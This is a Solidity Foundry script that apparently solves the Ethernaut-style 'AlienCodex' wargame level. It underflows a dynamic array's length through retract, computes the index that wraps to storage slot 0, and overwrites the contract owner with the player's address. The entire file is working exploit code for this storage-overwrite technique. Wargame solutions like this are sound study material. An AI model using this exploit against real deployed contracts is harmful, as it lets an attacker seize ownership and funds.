// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

// import "../instance/Level19.sol";
import "forge-std/Script.sol";

contract ExploitLevel19 is Script {
    IAlienCodex instance = IAlienCodex(0x052b8cbFd3c459DCFAB4E53ef8a56062Ac0aBf77);

    function run() external {
        uint256 index = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 player = bytes32(uint256(uint160(0x9606e11178a83C364108e99fFFD2f7F75C99d801)));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.makeContact();
        instance.retract();
        instance.revise(index, player);
        vm.stopBroadcast();
    }
}

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256, bytes32) external;
    function owner() external returns (address);
}
